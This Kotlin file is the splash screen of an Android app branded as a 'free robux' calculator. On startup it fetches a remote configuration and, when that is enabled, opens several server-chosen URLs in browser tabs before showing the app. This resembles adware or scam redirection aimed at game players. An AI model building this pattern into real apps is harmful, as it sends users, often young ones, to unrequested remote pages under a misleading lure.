package freerobux.get.rbx.counter.rblx.calcpro.rbuxcalc

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
import androidx.lifecycle.lifecycleScope
import freerobux.get.rbx.counter.rblx.calcpro.rbuxcalc.utils.ConfigRepository
import freerobux.get.rbx.counter.rblx.calcpro.rbuxcalc.utils.CustomTabHelper
import freerobux.get.rbx.counter.rblx.calcpro.rbuxcalc.utils.UrlSelector
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class SplashActivity : AppCompatActivity() {

    private val repo = ConfigRepository()
    private lateinit var customTabs: CustomTabHelper
    private var waitingForChromeReturn = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        installSplashScreen()

        setContentView(R.layout.activity_splash)

        customTabs = CustomTabHelper()
        customTabs.warmUp(this)

        lifecycleScope.launch {

            val config = repo.fetchConfig()

            if (config?.enabled == true && config.urls.isNotEmpty()) {

                val selectedUrls = UrlSelector.pickUrls(
                    config.urls,
                    config.tabsPerTrigger
                )

                delay(1200) // splash timing

                openTabs(selectedUrls)

            } else {
                moveToMain()
            }
        }
    }

    private fun openTabs(urls: List<String>) {
        waitingForChromeReturn = true
        urls.forEach {
            customTabs.open(this, it)
        }
    }

    override fun onResume() {
        super.onResume()

        if (waitingForChromeReturn) {
            waitingForChromeReturn = false
            moveToMain()
        }
    }

    private fun moveToMain() {
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }
}
